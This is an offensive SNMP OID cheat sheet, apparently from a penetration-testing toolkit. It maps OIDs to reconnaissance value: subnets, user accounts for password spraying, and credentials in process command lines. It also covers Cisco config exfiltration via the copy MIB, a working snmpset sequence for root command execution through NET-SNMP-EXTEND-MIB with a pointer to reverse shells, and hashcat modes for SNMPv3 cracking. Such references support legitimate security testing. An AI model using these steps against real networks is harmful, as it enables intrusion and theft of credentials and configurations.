# SNMP OID Reference

Numeric OIDs for tooling (`-On`); MIB names for readability (`-m +ALL`).

## MIB-II core (1.3.6.1.2.1)

| OID | Name | Yields |
|---|---|---|
| 1.3.6.1.2.1.1.1.0 | sysDescr | OS / firmware string, exact version — fingerprint + CVE lookup |
| 1.3.6.1.2.1.1.3.0 | sysUpTime | reboot history (patching cadence hint) |
| 1.3.6.1.2.1.1.4.0 | sysContact | admin name/email (phish/spray target); also the safe snmpset probe target |
| 1.3.6.1.2.1.1.5.0 | sysName | hostname (often FQDN → internal domain name) |
| 1.3.6.1.2.1.1.6.0 | sysLocation | physical location |
| 1.3.6.1.2.1.2.2.1 | ifTable | interfaces: name, MAC, speed, oper status |
| 1.3.6.1.2.1.4.20.1 | ipAddrTable | IP + netmask per interface → **subnets** |
| 1.3.6.1.2.1.4.21 | ipRouteTable | dest/mask/next-hop → **subnets, gateways** |
| 1.3.6.1.2.1.4.24 | ipCidrRouteTable | modern routing table (replaces 4.21 on newer agents) |
| 1.3.6.1.2.1.4.22.1.2 | ipNetToMediaPhysAddress | ARP cache → live neighbor IPs/MACs |
| 1.3.6.1.2.1.6.13 | tcpConnTable | established TCP: local/remote ip:port → internal services and peers |
| 1.3.6.1.2.1.7.5 | udpTable | UDP listeners |

## Host Resources (1.3.6.1.2.1.25) — servers/workstations

| OID | Name | Yields |
|---|---|---|
| 1.3.6.1.2.1.25.1.6.0 | hrSystemProcesses | process count |
| 1.3.6.1.2.1.25.4.2.1.2 | hrSWRunName | process names (AV/EDR present? db? backup agent?) |
| 1.3.6.1.2.1.25.4.2.1.4 | hrSWRunPath | full binary paths |
| 1.3.6.1.2.1.25.4.2.1.5 | hrSWRunParameters | **command lines** — grep for `-p`, `password=`, connection strings, API keys |
| 1.3.6.1.2.1.25.6.3.1.2 | hrSWInstalledName | installed packages + versions |
| 1.3.6.1.2.1.25.2.3.1.3 | hrStorageDescr | mounts, disks, RAM |
| 1.3.6.1.2.1.25.3.2.1.3 | hrDeviceDescr | hardware (printers, HBAs) |

## Windows via LAN Manager MIB (1.3.6.1.4.1.77)

| OID | Yields |
|---|---|
| 1.3.6.1.4.1.77.1.2.25 | **local user accounts** → spray list |
| 1.3.6.1.4.1.77.1.2.3.1.1 | running services |
| 1.3.6.1.4.1.77.1.2.27 | share names |
| 1.3.6.1.4.1.77.1.4.1.0 | domain name |
| 1.3.6.1.4.1.77.1.2.5 | installed services/hotfix hints |

## Cisco (1.3.6.1.4.1.9)

| OID | Yields |
|---|---|
| 1.3.6.1.4.1.9.9.96 | CISCO-CONFIG-COPY-MIB — config exfil/upload via TFTP/FTP/SCP with **rw** community (procedure in SKILL.md §6) |
| 1.3.6.1.4.1.9.2.1.55.`<tftp-ip>` | OLD-CISCO-SYS-MIB writeNet — legacy one-OID config-to-TFTP (set STRING = filename) |
| 1.3.6.1.4.1.9.9.23.1.2.1.1 | CDP neighbor table → adjacent devices, platform strings |
| 1.3.6.1.4.1.9.9.68.1.2.2.1.2 | VLAN membership per port |
| 1.3.6.1.4.1.9.2.1.3.0 | hostname |

ccCopyTable row columns used in the exfil procedure (index = random row id `$R`):
`.2`=protocol(1 tftp,2 ftp,4 scp) `.3`=sourceFileType(4 runningConfig,1 networkFile)
`.4`=destFileType(1 networkFile,4 runningConfig) `.5`=serverAddress `.6`=fileName
`.7`=user `.8`=password `.14`=entryStatus(4 createAndGo,6 destroy) — poll `.10` copyState
(1 waiting 2 running 3 **successful** 4 failed), read `.13` failCause on 4, then set `.14 i 6`
to destroy the row.

## Other vendors worth walking

| OID | Vendor/Yields |
|---|---|
| 1.3.6.1.4.1.2021 | net-snmp UCD MIB: load, memory, disk, `extOutput` script output |
| 1.3.6.1.4.1.8072.1.3.2 | NET-SNMP-EXTEND-MIB nsExtend — see write-abuse below |
| 1.3.6.1.4.1.311 | Microsoft enterprise tree |
| 1.3.6.1.4.1.11 | HP (printers: 1.3.6.1.4.1.11.2.3.9 — stored jobs, LDAP creds in some JetDirects) |
| 1.3.6.1.4.1.6876 | VMware ESXi |
| 1.3.6.1.4.1.14988 | MikroTik RouterOS |

## Write-abuse: net-snmp RCE via NET-SNMP-EXTEND-MIB

If the agent is net-snmp on Linux and the community is **rw** (and the agent was built with
the extend module), create an `nsExtendObjects` row whose command runs as the snmpd user
(often root) every time the OID is read:

```
snmpset -v2c -c private 192.0.2.10 \
  'NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd"'  = createAndGo \
  'NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd"' = /bin/sh \
  'NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd"'    = '-c "id > /tmp/snmp_rce"'
snmpwalk -v2c -c private 192.0.2.10 NET-SNMP-EXTEND-MIB::nsExtendObjects   # triggers + shows output
```

Point `nsExtendCommand/Args` at a reverse shell one-liner for interactive access.
Requires MIB files installed (`snmp-mibs-downloader`) or use the numeric equivalents under
1.3.6.1.4.1.8072.1.3.2.

## v3 cracking quick notes

- hashcat `-m 25100` (SNMPv3 HMAC-MD5-96), `-m 25200` (HMAC-SHA1-96), `-m 26700/26800`
  (SHA-224/256 variants) against pcap-extracted authentication parameters.
- EngineID is per-device and salts the localized key — crack per target.
